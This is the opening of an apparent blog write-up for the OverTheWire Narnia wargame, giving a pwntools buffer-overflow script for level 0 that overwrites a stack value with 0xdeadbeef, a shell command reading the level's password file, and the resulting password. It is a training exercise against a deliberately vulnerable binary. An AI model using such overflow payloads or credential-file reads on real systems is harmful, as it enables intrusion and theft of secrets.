Narnia is a set of challenges consisting of 10 levels on [overthewire.org](https://overthewire.org/wargames/vortex/)

I'll be attempting to solve the challenges and will post the solutions to each level on this very blog post, Starting from
15th April 2024.

## Level 0
Trival.
```py
from pwn import *

target = process("./narnia0")
print(target.recv())
target.send('A'*20 + "\xef\xbe\xad\xde\n")
print(target.recv())
target.interactive()
```
You get a shell.
```
  cat /etc/narnia_pass/narnia1
  eaa6AjYMBB
```
Password for Level 1: `eaa6AjYMBB`
